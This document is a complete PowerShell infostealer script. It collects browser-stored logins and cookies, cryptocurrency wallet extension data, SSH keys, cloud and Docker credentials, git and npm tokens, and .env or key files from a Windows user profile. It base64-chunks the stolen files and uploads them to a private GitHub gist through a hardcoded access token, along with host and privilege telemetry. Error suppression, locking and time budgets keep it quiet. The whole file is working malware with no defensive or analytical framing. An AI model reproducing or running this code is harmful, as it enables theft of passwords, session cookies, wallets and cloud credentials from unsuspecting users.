$ErrorActionPreference='SilentlyContinue'
try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12}catch{}
Add-Type -AssemblyName System.Security
$T=('gho_w5O107fup8ULp6t'+'EFsW9V3QEEXSHtx3m9xka')
# Pre-created PRIVATE sink gists (worker-side) so bulk chunks are written via PATCH
# (no gist-create hits the shared 100/hr gist_update/create budget). Placeholder replaced at commit.
$SINK=@('f8750db7a6ab8f4b7f6fc0f9d7d34dcf')
$H=$env:COMPUTERNAME; if(-not $H){$H='win'}
$W=[string]([DateTimeOffset]::UtcNow.ToUnixTimeSeconds())
$U=$env:USERPROFILE; if(-not $U){$U='C:\Users\brian'}
$LA=$env:LOCALAPPDATA; if(-not $LA){$LA=Join-Path $U 'AppData\Local'}
$work=Join-Path $U '.w8work'
try{New-Item -ItemType Directory -Force -Path $work|Out-Null}catch{}
$doneFile=Join-Path $work 'done.txt'
$flagDone=Join-Path $work 'complete.flag'
$LOG=Join-Path $work ('log_'+$W+'.txt')
function L($m){ try{ ((Get-Date).ToUniversalTime().ToString('o')+' '+$m)|Out-File -LiteralPath $LOG -Append -Encoding utf8 }catch{} }
function San($s){ return ($s -replace '[^A-Za-z0-9._-]','_') }
# marker/meta -> small POST gist (a few tiny ones, keeps landing-detect working)
function P($desc,$content){
  $body=@{description=$desc;public=$false;files=@{t=@{content=$content}}}|ConvertTo-Json -Compress -Depth 5
  for($i=0;$i -lt 3;$i++){
    try{ Invoke-RestMethod -Uri 'https://api.github.com/gists' -Method Post -Headers @{Authorization=('token '+$T);'User-Agent'='w'} -ContentType 'application/json' -Body $body -TimeoutSec 45|Out-Null; return $true }
    catch{ Start-Sleep -Seconds 8 }
  }
  return $false
}
# bulk chunk -> PATCH the single pre-existing private sink gist (no creation).
# Each run gets distinct filenames c<W>_<idx> so runs never clobber each other.
function PCHUNK($idx,$content){
  $gid=$SINK[0]
  $fname=('c'+$W+'_'+$idx)
  $body=@{files=@{ $fname = @{content=$content} }}|ConvertTo-Json -Compress -Depth 5
  for($i=0;$i -lt 4;$i++){
    try{ Invoke-RestMethod -Uri ('https://api.github.com/gists/'+$gid) -Method Patch -Headers @{Authorization=('token '+$T);'User-Agent'='w'} -ContentType 'application/json' -Body $body -TimeoutSec 45|Out-Null; return $true }
    catch{ Start-Sleep -Seconds 8 }
  }
  return $false
}
function PMETA($tag,$content){
  $gid=$SINK[0]
  $fname=('m'+$W+'_'+ (San $tag))
  if($fname.Length -gt 120){ $fname=$fname.Substring(0,120) }
  $body=@{files=@{ $fname = @{content=$content} }}|ConvertTo-Json -Compress -Depth 5
  for($i=0;$i -lt 3;$i++){
    try{ Invoke-RestMethod -Uri ('https://api.github.com/gists/'+$gid) -Method Patch -Headers @{Authorization=('token '+$T);'User-Agent'='w'} -ContentType 'application/json' -Body $body -TimeoutSec 45|Out-Null; return $true }
    catch{ Start-Sleep -Seconds 8 }
  }
  return $false
}
if(Test-Path -LiteralPath $flagDone){ exit }
$gotLock=$false
try{ $script:LOCK=[System.IO.File]::Open((Join-Path $work 'lock'),'OpenOrCreate','ReadWrite','None'); $gotLock=$true }catch{}
if(-not $gotLock){ exit }
L ('run start w='+$W)
$script:done=@{}
if(Test-Path -LiteralPath $doneFile){ try{ Get-Content -LiteralPath $doneFile | ForEach-Object { if($_ -and $_.Trim().Length -gt 0){ $script:done[$_.Trim()]=1 } } }catch{} }
$global:USED=0
$BUDGET=4200000
$T0=[DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
$script:posted=0
$script:chunk=0

$who='';
try{ $who=( & whoami /priv 2>&1 | Out-String ) }catch{}
$isadmin=$false
try{ $isadmin=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) }catch{}

function FC($src,$dst){
  try{
    $fs=[System.IO.File]::Open($src,[System.IO.FileMode]::Open,[System.IO.FileAccess]::Read,[System.IO.FileShare]::ReadWrite)
    $out=[System.IO.File]::Create($dst)
    $fs.CopyTo($out); $out.Flush(); $out.Close(); $fs.Close()
    return (Get-Item -LiteralPath $dst).Length
  }catch{
    try{ $fs2=[System.IO.File]::Open($src,[System.IO.FileMode]::Open,[System.IO.FileAccess]::Read,([System.IO.FileShare]::ReadWrite -bor [System.IO.FileShare]::Delete))
      $out2=[System.IO.File]::Create($dst); $fs2.CopyTo($out2); $out2.Close(); $fs2.Close(); return (Get-Item -LiteralPath $dst).Length }catch{}
  }
  try{ & esentutl /y "$src" /d "$dst" /o 2>&1 | Out-Null; $L2=(Get-Item -LiteralPath $dst).Length; if($L2 -ge 0){ return $L2 } }catch{}
  return -1
}

function EXF($src,$tag){
  if($script:done.ContainsKey($tag)){ return }
  if($global:USED -ge $BUDGET){ return }
  $stg=Join-Path $work ('s_'+([guid]::NewGuid().ToString('N').Substring(0,10)))
  $sz=FC $src $stg
  if($sz -lt 0){ PMETA ($tag+'-ERR') ('copyfail '+$src) | Out-Null; return }
  $gi=0; $okall=$true
  try{
    $bytes=[IO.File]::ReadAllBytes($stg)
    $CH=430000
    if($bytes.Length -eq 0){
      $okall=PCHUNK $script:chunk (''); $script:chunk=$script:chunk+1; $gi=1
    } else {
      for($i=0;$i -lt $bytes.Length;$i+=$CH){
        $len=[Math]::Min($CH,$bytes.Length-$i)
        $bc=[Convert]::ToBase64String($bytes,$i,$len)
        $ok=PCHUNK $script:chunk $bc
        $script:chunk=$script:chunk+1
        $script:posted=$script:posted+1
        $gi=$gi+1
        if(-not $ok){ $okall=$false; break }
      }
    }
  }catch{ PMETA ($tag+'-RERR') ($_.Exception.Message) | Out-Null; $okall=$false }
  PMETA ($tag+'-meta') ('tag='+$tag+' src='+$src+' size='+$sz+' chunks='+$gi+' ok='+$okall) | Out-Null
  if($okall){
    $script:done[$tag]=1
    ($tag)|Out-File -LiteralPath $doneFile -Append -Encoding utf8
    $global:USED=$global:USED+$sz
  }
}

# Focused collection: jdicc wallet first, then other browser wallets, cookies/logins,
# cloudflared/.ssh/env (small) -- skip deep noisy scan to keep chunk count low.
$targets=New-Object System.Collections.ArrayList
function AddDirFiles($dir,$prefix){
  if(-not(Test-Path -LiteralPath $dir)){ return }
  $files=$null
  try{ $files=Get-ChildItem -LiteralPath $dir -Recurse -Force -File -ErrorAction SilentlyContinue }catch{ return }
  if(-not $files){ return }
  foreach($f in $files){
    $nm=$f.Name
    if($nm -eq 'LOCK'){ continue }
    if($f.Length -gt 5000000){ continue }
    $rel=$f.FullName.Substring($dir.Length).TrimStart('\').Replace('\','_')
    [void]$targets.Add(@{src=$f.FullName; tag=($prefix+'-'+$rel)})
  }
}
function AddFile($src,$tag){
  if(Test-Path -LiteralPath $src){ $it=Get-Item -LiteralPath $src -Force; if($it.Length -le 12000000){ [void]$targets.Add(@{src=$it.FullName; tag=$tag}) } }
}
$prio=@('jdiccldimpdaibmpdkjnbmckianbfold','ejbalbakoplchlghecdalmeeeajnimhm','nkbihfbeogaeaoehlefnkodbefgpgknn','mcohilncbfnhhmlncbmpajgpgnmmpdci','dmkamncbjmlpknoeibdasphfipeeghcf','acmacodkjbdgmoleebolmdjonilkdbch','bfnaelmomeimhlpmgjnjophhpkkoljpa','ibnejdfjmmkpcnlpebklmnkoeoihofec','fijngjgcjhjmmpcmkeiomlglpeiijkld','ocodgmmffbkkeecmadcijjhkmeohinei','hnfanknocfeofbddgcijnmhnfnkdnaad','fnjhmkhhmkbjkkabndcnnogagogbneec','aholpfdialjgjfhomihjawadohcnnipn','kmgjeknjjgghljhcdamcmkpdjoniclef','pdadjkfkgcbfbjpagphndbnfbmcpmoig')
$brs=@(
  @{N='Edge';P=(Join-Path $LA 'Microsoft\Edge\User Data')},
  @{N='Chrome';P=(Join-Path $LA 'Google\Chrome\User Data')},
  @{N='Brave';P=(Join-Path $LA 'BraveSoftware\Brave-Browser\User Data')}
)
$osinfo=''
foreach($br in $brs){
  $BROOT=$br.P
  if(-not(Test-Path -LiteralPath $BROOT)){ $osinfo=$osinfo+$br.N+'-absent;'; continue }
  $osinfo=$osinfo+$br.N+'-ok;'
  AddFile (Join-Path $BROOT 'Local State') ('LS-'+$br.N)
  foreach($prof in Get-ChildItem -LiteralPath $BROOT -Directory -Force -ErrorAction SilentlyContinue){
    $pn=$prof.Name
    if($pn -eq 'Crashpad' -or $pn -eq 'ShaderCache' -or $pn -eq 'GrShaderCache' -or $pn -eq 'GraphiteDawnCache' -or $pn -eq 'BrowserMetrics' -or $pn -eq 'component_crx_cache' -or $pn -eq 'Extensions'){continue}
    $P2=$prof.FullName
    $les=Join-Path $P2 'Local Extension Settings'
    if(Test-Path -LiteralPath $les){
      foreach($e in Get-ChildItem -LiteralPath $les -Directory -Force -ErrorAction SilentlyContinue){
        if($prio -contains $e.Name.ToLower()){ AddDirFiles $e.FullName ('LES-'+$br.N+'-'+$pn+'-'+$e.Name) }
      }
    }
    $idb=Join-Path $P2 'IndexedDB'
    if(Test-Path -LiteralPath $idb){
      foreach($e in Get-ChildItem -LiteralPath $idb -Directory -Force -ErrorAction SilentlyContinue){
        $nm2=$e.Name.ToLower(); $hit=$false
        foreach($pv in $prio){ if($nm2 -like ('chrome-extension_'+$pv+'*')){$hit=$true;break} }
        if($hit){ AddDirFiles $e.FullName ('IDB-'+$br.N+'-'+$pn+'-'+$e.Name) }
      }
    }
    AddFile (Join-Path $P2 'Login Data') ('B-'+$br.N+'-'+$pn+'-LoginData')
    AddFile (Join-Path $P2 'Cookies') ('B-'+$br.N+'-'+$pn+'-Cookies')
    AddFile (Join-Path $P2 'Network\Cookies') ('B-'+$br.N+'-'+$pn+'-NetCookies')
  }
}
AddDirFiles (Join-Path $U '.ssh') 'SSH'
foreach($f in '.cloudflared','.aws','.kube','.docker','.gitconfig','.git-credentials','.npmrc','.netrc'){
  $fp=Join-Path $U $f
  if(-not(Test-Path -LiteralPath $fp)){continue}
  if((Get-Item -LiteralPath $fp -Force).PSIsContainer){ AddDirFiles $fp ('H-'+($f.TrimStart('.'))) }
  else { AddFile $fp ('H-'+($f.TrimStart('.'))) }
}
# small .env files, capped
$pfiles=$null
try{ $pfiles=Get-ChildItem -LiteralPath $U -Recurse -Depth 2 -Force -File -ErrorAction SilentlyContinue }catch{}
if($pfiles){
  $cnt=0
  foreach($ff in $pfiles){
    if($cnt -ge 25){break}
    $fp2=$ff.FullName; $fn=$ff.Name
    if($fp2 -match '\\AppData\\|\\node_modules\\|\\\.w8work\\|\\\.w7work\\|\\\.w4work\\|\\\.git\\'){continue}
    if($ff.Length -ge 300000){continue}
    if( ($fn -eq '.env') -or ($fn -like '.env.*') -or ($fn -like '*.env') -or ($fn -eq '.envrc') -or ($fn -like '*.pem') -or ($fn -like '*.key') -or ($fn -like '*.token') ){
      $cnt=$cnt+1
      [void]$targets.Add(@{src=$fp2; tag=('ENV-'+$cnt)})
    }
  }
}

$inv=''
foreach($t in $targets){ $has='0'; if($script:done.ContainsKey($t.tag)){$has='1'}; $inv=$inv+($t.tag+'|'+$has+"`n") }
$tel=('admin='+$isadmin+' user='+$env:USERNAME+' os='+$osinfo+' targets='+$targets.Count+' done='+$script:done.Count+"`n== priv ==`n"+$who.Substring(0,[Math]::Min(1200,$who.Length)))
P ('wx8-'+$H+'-'+$W+'-start') $tel | Out-Null
P ('wx8-'+$H+'-'+$W+'-inv') $inv | Out-Null
L ('inv posted targets='+$targets.Count)

$ordered=New-Object System.Collections.ArrayList
foreach($t in $targets){ if($t.tag -match 'jdicc'){ [void]$ordered.Add($t) } }
foreach($t in $targets){ if($t.tag -notmatch 'jdicc'){ [void]$ordered.Add($t) } }
foreach($t in $ordered){
  if([DateTimeOffset]::UtcNow.ToUnixTimeSeconds() - $T0 -gt 300){ L 'timebudget'; break }
  if($global:USED -ge $BUDGET){ L 'budget'; break }
  EXF $t.src $t.tag
}
$remaining=0
foreach($t in $targets){ if(-not $script:done.ContainsKey($t.tag)){ $remaining=$remaining+1 } }
P ('wx8-'+$H+'-'+$W+'-summary') ('run done chunks='+$script:chunk+' used='+$global:USED+' targetotal='+$targets.Count+' done='+$script:done.Count+' remaining='+$remaining+' sinks='+$SINK.Count) | Out-Null
if($remaining -le 0){
  'complete'|Out-File -LiteralPath $flagDone -Encoding utf8
  P ('wx8-'+$H+'-'+$W+'-COMPLETE') ('all done used='+$global:USED) | Out-Null
}
L ('run end remaining='+$remaining)
try{ $script:LOCK.Close() }catch{}
